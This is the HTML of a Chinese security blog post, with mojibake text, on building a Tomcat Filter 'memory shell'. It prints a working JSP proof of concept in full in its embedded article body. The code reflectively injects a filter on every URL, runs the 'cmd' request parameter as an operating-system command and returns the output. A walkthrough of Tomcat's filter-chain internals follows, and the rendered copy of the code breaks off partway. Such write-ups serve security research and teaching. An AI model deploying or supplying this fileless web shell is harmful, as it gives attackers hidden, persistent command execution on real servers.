<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Tomcat Filterå†…å­˜é©¬ | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="hhhï¼ŒListenerå†…å­˜é©¬åˆ†æå®Œåï¼Œè‡ªå·±å°è¯•æ„é€ äº†Filter pocï¼Œæœ€åæ²¡å€ŸåŠ©åˆ†ææ–‡ç« æ„é€ å‡ºæ¥æŒºå…´å¥‹çš„hh ç¯å¢ƒ &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt; &lt;version&gt;9.0.96&lt;/version&gt; &lt;/dependency&gt; å…ˆè´´pocå§ï¼Œ">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="Tomcat Filterå†…å­˜é©¬" />
<meta property="og:description" content="hhhï¼ŒListenerå†…å­˜é©¬åˆ†æå®Œåï¼Œè‡ªå·±å°è¯•æ„é€ äº†Filter pocï¼Œæœ€åæ²¡å€ŸåŠ©åˆ†ææ–‡ç« æ„é€ å‡ºæ¥æŒºå…´å¥‹çš„hh ç¯å¢ƒ &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt; &lt;version&gt;9.0.96&lt;/version&gt; &lt;/dependency&gt; å…ˆè´´pocå§ï¼Œ" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-11-01T21:01:23+08:00" />
<meta property="article:modified_time" content="2024-11-01T21:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Tomcat Filterå†…å­˜é©¬"/>
<meta name="twitter:description" content="hhhï¼ŒListenerå†…å­˜é©¬åˆ†æå®Œåï¼Œè‡ªå·±å°è¯•æ„é€ äº†Filter pocï¼Œæœ€åæ²¡å€ŸåŠ©åˆ†ææ–‡ç« æ„é€ å‡ºæ¥æŒºå…´å¥‹çš„hh ç¯å¢ƒ &lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt; &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt; &lt;version&gt;9.0.96&lt;/version&gt; &lt;/dependency&gt; å…ˆè´´pocå§ï¼Œ"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Tomcat Filterå†…å­˜é©¬",
      "item": "https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Tomcat Filterå†…å­˜é©¬",
  "name": "Tomcat Filterå†…å­˜é©¬",
  "description": "hhhï¼ŒListenerå†…å­˜é©¬åˆ†æå®Œåï¼Œè‡ªå·±å°è¯•æ„é€ äº†Filter pocï¼Œæœ€åæ²¡å€ŸåŠ©åˆ†ææ–‡ç« æ„é€ å‡ºæ¥æŒºå…´å¥‹çš„hh ç¯å¢ƒ \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;9.0.96\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; å…ˆè´´pocå§ï¼Œ",
  "keywords": [
    
  ],
  "articleBody": "hhhï¼ŒListenerå†…å­˜é©¬åˆ†æå®Œåï¼Œè‡ªå·±å°è¯•æ„é€ äº†Filter pocï¼Œæœ€åæ²¡å€ŸåŠ©åˆ†ææ–‡ç« æ„é€ å‡ºæ¥æŒºå…´å¥‹çš„hh\nç¯å¢ƒ \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat\u003c/groupId\u003e \u003cartifactId\u003etomcat-catalina\u003c/artifactId\u003e \u003cversion\u003e9.0.96\u003c/version\u003e \u003c/dependency\u003e å…ˆè´´pocå§ï¼Œæƒ³çœ‹ç€å†™æµç¨‹\n0x01 poc \u003c%@ page import=\"java.lang.reflect.Field\" %\u003e \u003c%@ page import=\"javax.security.auth.message.callback.SecretKeyCallback\" %\u003e \u003c%@ page import=\"org.apache.catalina.connector.Request\" %\u003e \u003c%@ page import=\"org.apache.catalina.connector.Response\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationContextFacade\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationContext\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.StandardContext\" %\u003e \u003c%@ page import=\"java.io.*\" %\u003e \u003c%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %\u003e \u003c%@ page import=\"javax.servlet.annotation.WebFilter\" %\u003e \u003c%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %\u003e \u003c%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %\u003e \u003c%@ page import=\"java.util.Map\" %\u003e \u003c%@ page import=\"java.lang.reflect.Constructor\" %\u003e \u003c%@ page import=\"org.apache.catalina.Context\" %\u003e \u003c% //åå°„å¾—åˆ°StandardContext ApplicationContextFacade servletContext = (ApplicationContextFacade) request.getServletContext(); Field con = servletContext.getClass().getDeclaredField(\"context\"); con.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) con.get(servletContext); Field context = applicationContext.getClass().getDeclaredField(\"context\"); context.setAccessible(true); StandardContext Standardcontext1 = (StandardContext) context.get(applicationContext); @WebFilter(filterName = \"MyFilter\", urlPatterns = \"/*\") class myFilter implements Filter{ @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { try { String cmd = request.getParameter(\"cmd\"); Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); // è®¾ç½®å“åº”å¤´ï¼Œç¡®ä¿å®¢æˆ·ç«¯èƒ½æ­£ç¡®æ¥æ”¶æ–‡æœ¬æ•°æ® response.setContentType(\"text/plain\"); response.setCharacterEncoding(\"UTF-8\"); // è·å–è¾“å‡ºæµï¼Œç”¨äºå‘å®¢æˆ·ç«¯å‘é€æ•°æ® PrintWriter writer = response.getWriter(); String line; while ((line = reader.readLine())!= null) { writer.write(line + \"\\n\"); } // å…³é—­ç›¸å…³èµ„æº reader.close(); inputStream.close(); writer.close(); chain.doFilter(request, response); } catch (Exception e) { throw new RuntimeException(e); } } }; FilterDef filterDef = new FilterDef(); myFilter myFilter = new myFilter(); filterDef.setFilter(myFilter); filterDef.setFilterName(\"myFilter\"); FilterMap filterMap = new FilterMap(); filterMap.setFilterName(\"myFilter\"); filterMap.addURLPattern(\"/*\"); Standardcontext1.addFilterDef(filterDef); Standardcontext1.addFilterMap(filterMap); Field filterConfigs = Standardcontext1.getClass().getDeclaredField(\"filterConfigs\"); filterConfigs.setAccessible(true); Map map = (Map) filterConfigs.get(Standardcontext1); Class\u003c?\u003e aClass = Class.forName(\"org.apache.catalina.core.ApplicationFilterConfig\"); Constructor\u003c?\u003e declaredConstructor = aClass.getDeclaredConstructor(Context.class, FilterDef.class); declaredConstructor.setAccessible(true); ApplicationFilterConfig myconfig = (ApplicationFilterConfig) declaredConstructor.newInstance(Standardcontext1, filterDef); map.put(\"myFilter\", myconfig); out.println(1111111); %\u003e 0x02 åˆ†ææµç¨‹ å…ˆé€šè¿‡è¿™ä¸ªdemoï¼Œè°ƒè¯•åˆ†æï¼Œçœ‹ä»€ä¹ˆåœ°æ–¹è°ƒè¯•æˆ‘ä»¬çš„doFilter\npackage com.example.learnservlet; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import java.io.IOException; @WebFilter(filterName = \"TestFilter\", urlPatterns = \"/test/*\") public class TestFilter implements Filter { @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println(\"filter\"); chain.doFilter(request, response); } } å’Œlistenerä¸€æ ·çš„æ€è·¯çš„è¯ï¼Œè¿™é‡Œæˆ‘ä»¬å°±æ˜¯è¦æ·»åŠ æ¶æ„filteråˆ°filtersé‡Œ\nç„¶åæˆ‘ä»¬æ‰¾åˆ°addFilterï¼Œé€šè¿‡æ ˆï¼Œæˆ‘ä»¬å‘ç°æ¯æ¬¡è¯·æ±‚ApplicationFilterFactoryéƒ½ä¼šè°ƒç”¨ApplicationFilterChain.addFilter()æ–¹æ³•\nè¿™é‡Œæˆ‘ä»¬å¾€ä¸ŠæŸ¥çœ‹\nfilterMapså®é™…æ¥è‡ªStandardContextï¼ŒæŸ¥çœ‹findFilterMapsæ–¹æ³•ï¼Œå‘ç°filterMaps\nç„¶åæˆ‘ä»¬çœ‹åˆ°addFilterMapæ–¹æ³•ï¼Œè¿™é‡Œå°±æƒ³åˆ°æˆ‘ä»¬è·å¾—StandardContextå®ä¾‹åè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ’å…¥filterï¼Œä¸ä¹…è¡Œäº†å˜›\nä½†è¿™é‡Œæˆ‘ä»¬æŸ¥çœ‹filterMapså¹¶æ²¡æœ‰æˆ‘ä»¬çš„Filterç±»å±æ€§ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆä¼ å…¥æˆ‘ä»¬çš„Filterå®ä¾‹å‘¢\nç„¶åçœ‹è°ƒç”¨æ ˆå¾€ä¸Šçœ‹åˆ°åœ¨è°ƒç”¨addFilterMapæ–¹æ³•å‰ä¼šå…ˆè°ƒç”¨addFilterDefæ–¹æ³•\nè¿™é‡Œå»FilterDefå»æŸ¥æ‰¾ä¸€ç•ªï¼Œå‘ç°æœ‰è®¾ç½®Filterï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°æ–¹å¤šåŠæ˜¯ä¼ å…¥Filterçš„åœ°æ–¹äº†\nä½†æ˜¯æœ€åè°ƒç”¨çš„filterMapså’ŒFilterDefæœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œå…¶å®filteræ›´åƒå­˜å‚¨FilteråŸºæœ¬ä¿¡æ¯ï¼ˆFilteråå­—ï¼Œurlï¼‰ç­‰ï¼Œè€ŒFilterDefåˆ™å‚¨å­˜Filteråå­—å¯¹åº”çš„Filterå®ä¾‹\nfilterDefs.put(filterDef.getFilterName(), filterDef); è¿™é‡Œputï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯Filteråå­—ã€‚\nç„¶åé€šè¿‡å…¶ä»–demoFilterçš„æˆ‘ä»¬å¤§æ¦‚ä¹ŸçŸ¥é“filterMapsè¦è®¾ç½®ä»€ä¹ˆå€¼ï¼ˆFilteråå­—ï¼Œurlï¼‰\nç„¶åå°è¯•æ„é€ pocï¼Œæœ€åå†™å…¥filterä»£ç é•¿è¿™æ ·\nFilterDef filterDef = new FilterDef(); myFilter myFilter = new myFilter(); filterDef.setFilter(myFilter); filterDef.setFilterName(\"myFilter\"); FilterMap filterMap = new FilterMap(); filterMap.setFilterName(\"myFilter\"); filterMap.addURLPattern(\"/*\"); Standardcontext1.addFilterDef(filterDef); Standardcontext1.addFilterMap(filterMap); è¿è¡Œåï¼Œæ‰§è¡Œå‘ç°æ²¡ååº”ï¼Œè°ƒè¯•å‘ç°æ¼äº†ä¸€å¤„åœ°æ–¹\nè¿™é‡Œæˆ‘çš„filterMapså·²ç»æœ‰æˆ‘è‡ªå·±çš„filterMapäº†ï¼Œä½†æ˜¯æ‰§è¡Œæˆ‘çš„filterMapæ—¶è¿›å…¥äº†æœ€åè¿™ä¸ªcontinue\nå‘ç°filterConfigæ²¡æœ‰å€¼ï¼Œèµ·åˆæ²¡ç»†çœ‹è¿™é‡Œï¼Œä»¥ä¸ºè¿™é‡Œæ˜¯ç”¨æ¥å°è£…çš„ï¼Œåˆ°filterMapæ„é€ å°±èƒ½æˆåŠŸæ‰§è¡Œã€‚\nå€’å›æ¥æˆ‘ä»¬è·Ÿè¿›findFilterConfigæ–¹æ³•ï¼Œç„¶åå†æŸ¥çœ‹filterConfigså“ªäº›åœ°æ–¹è°ƒç”¨è¿‡\næŸ¥çœ‹å®Œï¼Œå‘ç°ä¹Ÿåªæœ‰**filterStart()**æ–¹æ³•è¿™é‡Œè¿›è¡Œè¿‡èµ‹å€¼\nçœ‹åˆ°è¿™ï¼Œæ€è·¯ä¹Ÿæ¸…æ™°äº†ï¼Œå°±æ˜¯åå°„è·å–filterConfigså†putä¸€ä¸ªApplicationFilterConfigï¼ŒæŸ¥çœ‹è‡ªæ„æ–¹æ³•å‚æ•°ï¼Œç„¶åä¸æ˜¯publicï¼Œè¿™ä¸ªæ„é€ æ–¹æ³•ä¹Ÿè¦é€šè¿‡åå°„ç„¶åå®ä¾‹åŒ–\nFilterä¼ å‚å¸¦æœ‰responseï¼Œä¸ç”¨è€ƒè™‘è·å–ï¼ŒservletContextå’ŒListenerä¸€æ ·çš„è·å–æ–¹å¼ï¼Œç„¶åå°±å¯ä»¥å®Œæ•´pocå•¦\nFilter çš„åŠ è½½æµç¨‹å¦‚ä¸‹\né€šè¿‡ ApplicationFilterFactory.createFilterChain() åˆ›å»º FilterChain è°ƒç”¨ StandardContext.findFilterMaps() å¾—åˆ° filterMaps éå† filterMaps, ä¾æ¬¡ä» StandardContext ä¸­ç”¨ filterMap.getFilterName() è·å–å¯¹åº”çš„ filterConfig, å¹¶å°†å…¶æ”¾å…¥ FilterChain æ‰§è¡Œ FilterChain.doFilter() å¹¶åœ¨å†…éƒ¨è°ƒç”¨ internalDoFilter æ–¹æ³• ä¾æ¬¡æ‰§è¡Œ filterConfig.getFilter() è·å– Filter å®ä¾‹, å¹¶æœ€ç»ˆè°ƒç”¨å…¶ doFilter æ–¹æ³• æ„Ÿè§‰è‡ªå·±ç¬¬ä¸€æ¬¡å†™ï¼Œæœ‰äº›æ½¦è‰ï¼Œä¹Ÿä¸æƒ³å¤§æ”¹äº†ï¼ˆæ‡’ï¼‰\n0x03 è¡¥å…… è¿™é‡Œè¡¥å……ä¸‹æµç¨‹ï¼Œç›´æ¥å€Ÿç”¨å…¶ä»–å¤§ä½¬çš„å›¾äº†\nè°ƒç”¨æ ˆ\nç›´æ¥è·³è½¬åˆ° StandardWrapperValve æ‰§è¡Œäº† filterChain.doFilter æ–¹æ³•, ç»§ç»­è·Ÿè¿›\nç„¶åæˆ‘ä»¬å›åˆ° StandardWrapperValve, å¾€å‰é¢ç¿»ç¿»çœ‹è¿™ä¸ª filterChain æ˜¯æ€ä¹ˆæ¥çš„\nè¿™é‡Œé€šè¿‡ ApplicationFilterFactory.createFilterChain() åˆ›å»º filterChain\néœ€è¦æ³¨æ„åˆ›å»ºè¿‡ç¨‹æ˜¯åŠ¨æ€çš„, å³æˆ‘ä»¬æ¯å‘èµ·ä¸€æ¬¡è¯·æ±‚, tomcat éƒ½ä¼šæ‰§è¡Œä¸€é createFilterChain, è¿™ä¹Ÿä¸ºåé¢å†…å­˜é©¬çš„æ¤å…¥åšäº†é“ºå«\nè·Ÿè¿› createFilterChain æ–¹æ³•\né¦–å…ˆä» Request å¯¹è±¡ä¸­è·å– filterChain, å¦‚æœ filterChain ä¸å­˜åœ¨, å°±è‡ªå·±æ–°å»ºä¸€ä¸ª, å†è®¾ç½®åˆ° req å†…\nç„¶åä» wrapper ä¸­è·å– StandardContext å¯¹è±¡, å¹¶ä¸”è°ƒç”¨ findFilterMaps æ–¹æ³•å¾—åˆ° filterMaps\næœ€åéå† filterMaps, é€šè¿‡ filterMap.getFilterName() ä» context ä¸­å¯»æ‰¾å¯¹åº”çš„ FilterConfig å¹¶ä¸”æ·»åŠ è‡³ filterChain\n",
  "wordCount" : "1770",
  "inLanguage": "zh",
  "datePublished": "2024-11-01T21:01:23+08:00",
  "dateModified": "2024-11-01T21:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      Tomcat Filterå†…å­˜é©¬
    </h1>
    <div class="post-meta"><span title='2024-11-01 21:01:23 +0800 CST'>2024-11-01</span>&nbsp;Â·&nbsp;4 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e7%8e%af%e5%a2%83" aria-label="ç¯å¢ƒ">ç¯å¢ƒ</a></li>
                    <li>
                        <a href="#0x01-poc" aria-label="0x01 poc">0x01 poc</a></li>
                    <li>
                        <a href="#0x02-%e5%88%86%e6%9e%90%e6%b5%81%e7%a8%8b" aria-label="0x02 åˆ†ææµç¨‹">0x02 åˆ†ææµç¨‹</a></li>
                    <li>
                        <a href="#0x03-%e8%a1%a5%e5%85%85" aria-label="0x03 è¡¥å……">0x03 è¡¥å……</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><p>hhhï¼ŒListenerå†…å­˜é©¬åˆ†æå®Œåï¼Œè‡ªå·±å°è¯•æ„é€ äº†Filter pocï¼Œæœ€åæ²¡å€ŸåŠ©åˆ†ææ–‡ç« æ„é€ å‡ºæ¥æŒºå…´å¥‹çš„hh</p>
<h1 id="ç¯å¢ƒ">ç¯å¢ƒ<a hidden class="anchor" aria-hidden="true" href="#ç¯å¢ƒ">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">groupId</span><span class="o">&gt;</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="o">&lt;/</span><span class="n">groupId</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="n">tomcat</span><span class="o">-</span><span class="n">catalina</span><span class="o">&lt;/</span><span class="n">artifactId</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="o">&lt;</span><span class="n">version</span><span class="o">&gt;</span><span class="n">9</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">96</span><span class="o">&lt;/</span><span class="n">version</span><span class="o">&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;/</span><span class="n">dependency</span><span class="o">&gt;</span><span class="w">
</span></span></span></code></pre></div><p>å…ˆè´´pocå§ï¼Œæƒ³çœ‹ç€å†™æµç¨‹</p>
<h1 id="0x01-poc">0x01 poc<a hidden class="anchor" aria-hidden="true" href="#0x01-poc">#</a></h1>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javax.security.auth.message.callback.SecretKeyCallback&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.connector.Response&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContextFacade&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.io.*&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javax.servlet.annotation.WebFilter&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationFilterConfig&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.util.Map&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.lang.reflect.Constructor&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;org.apache.catalina.Context&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;%
</span></span><span class="line"><span class="cl">  //åå°„å¾—åˆ°StandardContext
</span></span><span class="line"><span class="cl">  ApplicationContextFacade servletContext = (ApplicationContextFacade) request.getServletContext();
</span></span><span class="line"><span class="cl">  Field con = servletContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">  con.setAccessible(true);
</span></span><span class="line"><span class="cl">  ApplicationContext applicationContext = (ApplicationContext) con.get(servletContext);
</span></span><span class="line"><span class="cl">  Field context = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">  context.setAccessible(true);
</span></span><span class="line"><span class="cl">  StandardContext Standardcontext1 = (StandardContext) context.get(applicationContext);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  @WebFilter(filterName = &#34;MyFilter&#34;, urlPatterns = &#34;/*&#34;)
</span></span><span class="line"><span class="cl">  class myFilter implements Filter{
</span></span><span class="line"><span class="cl">    @Override
</span></span><span class="line"><span class="cl">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
</span></span><span class="line"><span class="cl">      try {
</span></span><span class="line"><span class="cl">        String cmd = request.getParameter(&#34;cmd&#34;);
</span></span><span class="line"><span class="cl">        Process exec = Runtime.getRuntime().exec(cmd);
</span></span><span class="line"><span class="cl">        InputStream inputStream = exec.getInputStream();
</span></span><span class="line"><span class="cl">        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
</span></span><span class="line"><span class="cl">        // è®¾ç½®å“åº”å¤´ï¼Œç¡®ä¿å®¢æˆ·ç«¯èƒ½æ­£ç¡®æ¥æ”¶æ–‡æœ¬æ•°æ®
</span></span><span class="line"><span class="cl">        response.setContentType(&#34;text/plain&#34;);
</span></span><span class="line"><span class="cl">        response.setCharacterEncoding(&#34;UTF-8&#34;);
</span></span><span class="line"><span class="cl">        // è·å–è¾“å‡ºæµï¼Œç”¨äºå‘å®¢æˆ·ç«¯å‘é€æ•°æ®
